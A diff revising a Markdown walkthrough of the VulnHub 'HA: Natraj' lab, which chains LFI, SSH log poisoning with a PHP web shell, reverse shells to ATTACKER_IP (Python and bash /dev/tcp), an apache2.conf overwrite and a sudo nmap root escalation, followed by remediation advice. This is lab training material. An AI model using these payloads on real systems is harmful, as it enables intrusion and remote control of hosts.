@@ -1,178 +1,269 @@
 # HA: Natraj — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.10.156 (host-only) |
-| **Difficulty** | Easy |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.10.156 |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Root Flag** | See screenshot (root shell obtained) |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/ha-natraj,489/) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/ha-natraj-vulnhub-walkthrough/) |
+| **VulnHub** | https://www.vulnhub.com/entry/ha-natraj,489/ |
 
 ## Attack Summary
 
-nmap → dirb → LFI (`file.php?file=`) → SSH log poisoning via `/var/log/auth.log` → www-data shell → writable `apache2.conf` → `mahakal` shell → `sudo nmap --interactive` → root
+HA: Natraj chains three techniques to reach root: directory brute-forcing uncovers a PHP file, a Local File Inclusion (LFI) vulnerability in that file is escalated to Remote Code Execution (RCE) via SSH log poisoning (auth.log injection), then privilege escalation from `www-data` to an intermediate user (`mahakal`) is achieved by exploiting write access to `apache2.conf`, and finally from `mahakal` to root via `sudo nmap --interactive`.
 
 ## Methodology
 
-1. Network discovery
-2. Port scan and web enumeration
-3. LFI discovery and SSH log poisoning
-4. Reverse shell as `www-data`
-5. Privilege escalation to `mahakal` via apache2.conf
-6. Root via sudo nmap interactive
+1. Reconnaissance: nmap full-port scan
+2. Enumeration: dirb directory brute-force, source inspection
+3. Exploitation: LFI discovery, SSH log poisoning to RCE
+4. Lateral movement: writable `apache2.conf` to change Apache user
+5. Privilege escalation: `sudo nmap` interactive mode
 
----
+## Step 1: Reconnaissance
 
-## Step 1: Network Discovery
+### Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.10.0/24
+netdiscover
 ```
 
-Note the target IP, then run a full service scan:
+Target identified at `192.168.10.156`.
+
+### Port Scan
 
 ```bash
 nmap -sV -sC -p- 192.168.10.156
 ```
 
-Open ports: 22 (SSH), 80 (HTTP).
+Open ports:
+- 22/tcp — SSH (OpenSSH)
+- 80/tcp — HTTP (Apache)
 
-![Netdiscover result](images/01-netdiscover.png)
-
----
+![nmap scan](images/01-nmap.png)
 
 ## Step 2: Web Enumeration
 
-Browse to the web server — a Hindu deity themed page. Run dirb to find hidden paths:
+### Manual Inspection
+
+Browse to `http://192.168.10.156`. The page displays images and text about Natraj. Checking `robots.txt` and page source reveals nothing immediately useful.
+
+### Directory Brute-Force
 
 ```bash
-dirb http://192.168.10.156/
+dirb http://192.168.10.156
 ```
 
-Found: `/console/` directory containing `file.php`.
+Dirb finds the directory `/console/`.
 
-![nmap scan](images/02-nmap.png)
+### File Discovery inside /console
 
----
+Browsing to `http://192.168.10.156/console/` lists a file: `file.php`.
 
-## Step 3: LFI Discovery
+Loading `http://192.168.10.156/console/file.php` with no parameters returns an empty response.
 
-Navigate to `http://192.168.10.156/console/file.php`. The parameter `file` is vulnerable to Local File Inclusion:
+## Step 3: Local File Inclusion
 
-```
-http://192.168.10.156/console/file.php?file=/etc/passwd
-```
+Test the `file` parameter (matching the filename pattern) for LFI:
 
-Confirm LFI by reading `/var/log/auth.log`:
-
-```
-http://192.168.10.156/console/file.php?file=/var/log/auth.log
+```bash
+curl "http://192.168.10.156/console/file.php?file=../../../../etc/passwd"
 ```
 
-The log is readable — SSH auth attempts appear in it.
+The response includes `/etc/passwd` contents — LFI is confirmed.
 
-![LFI proof of concept](images/03-lfi.png)
+![LFI proof of concept](images/02-lfi.png)
 
----
+Check whether the auth log is readable:
 
-## Step 4: SSH Log Poisoning
+```bash
+curl "http://192.168.10.156/console/file.php?file=../../../../var/log/auth.log"
+```
 
-Inject a PHP web shell into the SSH auth log by passing it as the SSH username:
+The auth log is accessible. This enables **SSH log poisoning**.
+
+## Step 4: SSH Log Poisoning (LFI to RCE)
+
+### Inject PHP into auth.log
+
+SSH login attempts are recorded in `/var/log/auth.log`. The username field is logged without sanitization. Send a PHP snippet as the username:
 
 ```bash
 ssh '<?php system($_GET["cmd"]); ?>'@192.168.10.156
 ```
 
-The string is written to `/var/log/auth.log`. Verify execution:
+Authentication will fail, but the PHP payload is now written into `auth.log`.
 
-```
-http://192.168.10.156/console/file.php?file=/var/log/auth.log&cmd=id
+### Verify RCE
+
+Include the log through the LFI parameter and pass a command via the `cmd` parameter:
+
+```bash
+curl "http://192.168.10.156/console/file.php?file=../../../../var/log/auth.log&cmd=id"
 ```
 
-Response shows `uid=33(www-data)`. Now trigger a reverse shell. Set up listener:
+The output should include `uid=33(www-data)` — RCE as `www-data` is confirmed.
+
+## Step 5: Reverse Shell as www-data
+
+### Start a Netcat Listener
+
+On the attacker machine:
 
 ```bash
 nc -lvnp 1234
 ```
 
-URL-encode the reverse shell payload and send via the `cmd` parameter:
+### Send the Reverse Shell
 
-```
-cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-```
-
-Shell received as `www-data`.
-
-![www-data shell received](images/04-shell.png)
-
----
-
-## Step 5: Privilege Escalation to mahakal
-
-Enumerate write permissions:
+URL-encode the reverse shell command and deliver it through the LFI + RCE chain:
 
 ```bash
-find / -writable -type f 2>/dev/null | grep -v proc
+# Raw command:
+# bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1
+# URL-encoded:
+curl "http://192.168.10.156/console/file.php?file=../../../../var/log/auth.log&cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F1234%200%3E%261"
 ```
 
-`/etc/apache2/apache2.conf` is writable by `www-data`. Inspect the file to find `User` and `Group` directives — currently set to `www-data`. Edit to change the user to `mahakal`:
+A shell as `www-data` connects to the listener.
+
+![www-data reverse shell](images/03-reverse-shell.png)
+
+### Upgrade to Interactive Shell
 
 ```bash
-# On attacker: edit the User/Group line in a local copy
-# Change: User ${APACHE_RUN_USER}  →  User mahakal
-# Change: Group ${APACHE_RUN_GROUP} →  Group mahakal
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Then: Ctrl+Z, stty raw -echo; fg, export TERM=xterm
+```
 
-# Serve the modified file
+## Step 6: Privilege Escalation to mahakal
+
+### Discover Writable apache2.conf
+
+Run enumeration:
+
+```bash
+find / -writable -name "apache2.conf" 2>/dev/null
+# Or use LinEnum: wget http://ATTACKER_IP/LinEnum.sh -O /tmp/le.sh && bash /tmp/le.sh
+```
+
+The file `/etc/apache2/apache2.conf` is writable by `www-data`.
+
+![LinEnum writable file](images/04-privesc.png)
+
+### Modify Apache to Run as mahakal
+
+On the attacker machine, download `apache2.conf` and edit the `User` directive:
+
+```bash
+# Change the line:
+# User www-data
+# to:
+# User mahakal
+```
+
+Serve the modified file:
+
+```bash
 python3 -m http.server 8000
 ```
 
-On target:
+On the target, fetch and replace the config:
 
 ```bash
 wget http://ATTACKER_IP:8000/apache2.conf -O /etc/apache2/apache2.conf
+```
+
+### Deploy a PHP Reverse Shell
+
+Place a PHP reverse shell in the web root:
+
+```bash
+# On Kali, copy /usr/share/webshells/php/php-reverse-shell.php
+# Edit LHOST/LPORT then serve it
+wget http://ATTACKER_IP:8000/shell.php -O /var/www/html/shell.php
+```
+
+Start a listener on port 5555:
+
+```bash
+nc -lvnp 5555
+```
+
+Restart Apache (requires a method to trigger a restart — either wait for a scheduled restart or use a privilege that allows it):
+
+```bash
 sudo /bin/systemctl restart apache2
 ```
 
-Trigger a new reverse shell from the PHP file hosted on the server — this time it runs as `mahakal`.
+Then trigger the shell:
 
----
+```bash
+curl http://192.168.10.156/shell.php
+```
 
-## Step 6: Root via sudo nmap
+A shell as `mahakal` connects.
+
+## Step 7: Privilege Escalation to root
+
+Check sudo permissions:
 
 ```bash
 sudo -l
-# Output: (root) NOPASSWD: /usr/bin/nmap
 ```
 
-Use nmap interactive mode to spawn a root shell:
+Output shows:
+
+```
+(root) NOPASSWD: /usr/bin/nmap
+```
+
+Use nmap's `--interactive` mode (or Lua script execution) to spawn a root shell:
 
 ```bash
+# Method 1: nmap interactive (older versions)
 sudo nmap --interactive
-nmap> !sh
+# Then at nmap prompt:
+!sh
+
+# Method 2: nmap script exec (newer versions)
+TF=$(mktemp)
+echo 'os.execute("/bin/sh")' > $TF
+sudo nmap --script=$TF
 ```
 
-Shell is now root.
+Root shell obtained.
+
+![root flag](images/05-root-flag.png)
+
+Read the flag:
 
 ```bash
 cat /root/flag.txt
 ```
 
-![Root access](images/05-root.png)
+## Vulnerabilities Found
 
----
+| # | Vulnerability | Location | Severity |
+|---|---|---|---|
+| 1 | Local File Inclusion (LFI) | `file.php?file=` | Critical |
+| 2 | SSH Log Poisoning (LFI→RCE) | `/var/log/auth.log` | Critical |
+| 3 | World-writable `/etc/apache2/apache2.conf` | Apache config | High |
+| 4 | `sudo nmap` without password | sudoers | Critical |
 
 ## Lessons Learned
 
-1. **LFI in PHP** — `file.php?file=` with no sanitization allows reading arbitrary files, including log files
-2. **SSH log poisoning** — injecting PHP payloads as SSH usernames is a classic LFI-to-RCE technique
-3. **World-writable config files** — `apache2.conf` writable by `www-data` allows privilege escalation by changing the server run user
-4. **sudo nmap** — `nmap --interactive` (legacy mode) spawns a shell, escalating to root when nmap is in the sudoers list
+- LFI vulnerabilities that can read log files are often escalatable to RCE without needing to upload files directly.
+- SSH authentication logs recording the username field verbatim is the key enabler of this attack.
+- Writable service configuration files allow changing the service's runtime user, enabling lateral movement.
+- Any `sudo` entry for an interactive interpreter or program that can execute arbitrary code leads directly to root.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| LFI in file.php | Validate and whitelist the `file` parameter; never pass user input to file-include functions |
-| Writable apache2.conf | Set correct ownership (`root:root`) and permissions (`644`) on config files |
-| sudo nmap | Remove nmap from sudoers; use specific, minimal sudo rules |
-| SSH log poisoning | Restrict log readability; use fail2ban to limit SSH brute force attempts |
+|---|---|
+| LFI | Validate and whitelist allowed file paths; never pass user input directly to `include()` or `file_get_contents()` |
+| Log poisoning | Sanitize or encode log entries; disable LFI before addressing log exposure |
+| Writable config | Set `apache2.conf` ownership to root:root with mode 644 |
+| sudo nmap | Remove nmap from sudoers; if needed, use a restricted wrapper script |
